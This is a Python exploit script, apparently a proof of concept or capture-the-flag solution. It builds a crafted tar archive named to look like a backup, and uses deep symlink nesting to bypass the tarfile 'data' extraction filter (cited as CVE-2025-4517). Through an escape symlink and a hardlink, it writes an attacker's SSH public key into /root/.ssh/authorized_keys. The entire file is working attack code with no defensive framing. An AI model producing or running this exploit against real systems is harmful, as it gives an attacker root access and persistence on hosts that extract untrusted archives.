import tarfile
import os
import io

# 1. Setup - Use a long directory name to eat up buffer space
long_dir = 'd' * 247
# 16 levels of nesting
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("backup_1001.tar", mode="w") as tar:
    # 2. Build the deep directory structure
    for i in steps:
        # Create directory
        d = tarfile.TarInfo(os.path.join(path, long_dir))
        d.type = tarfile.DIRTYPE
        tar.addfile(d)
        
        # Create symlink pointing into it
        s = tarfile.TarInfo(os.path.join(path, i))
        s.type = tarfile.SYMTYPE
        s.linkname = long_dir
        tar.addfile(s)
        
        # Update path for next iteration
        path = os.path.join(path, long_dir)

    # 3. Create the "Overflow" Symlink
    # This path length triggers the CVE-2025-4517 bypass in filter="data"
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps) # Points back to root of extraction
    tar.addfile(l)

    # 4. Create the Escape Link
    # This symlink utilizes the overflow to traverse to /root/.ssh/
    escape = tarfile.TarInfo("escape")
    escape.type = tarfile.SYMTYPE
    # Adjust traversal depth as needed, 5 is usually safe for /opt/...
    escape.linkname = linkpath + "/../../../../../root/.ssh/authorized_keys"
    tar.addfile(escape)

    # 5. Write the malicious authorized_keys
    # Create a hardlink to the escape file to write data to it
    exploit_file = tarfile.TarInfo("pwn_keys")
    exploit_file.type = tarfile.LNKTYPE
    exploit_file.linkname = "escape"
    tar.addfile(exploit_file)

    # The content of your public key
    # REPLACE WITH YOUR ACTUAL ID_RSA.PUB
    ssh_key = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN5NZ+D1hDPNMezEO8R1+N4ZEgkrzDOJ4Bz+L0y+2G+D z0n@0x0z0n\n"
    
    key_entry = tarfile.TarInfo("pwn_keys")
    key_entry.type = tarfile.REGTYPE
    key_entry.size = len(ssh_key)
    tar.addfile(key_entry, fileobj=io.BytesIO(ssh_key))

print("[+] backup_1001.tar created.")
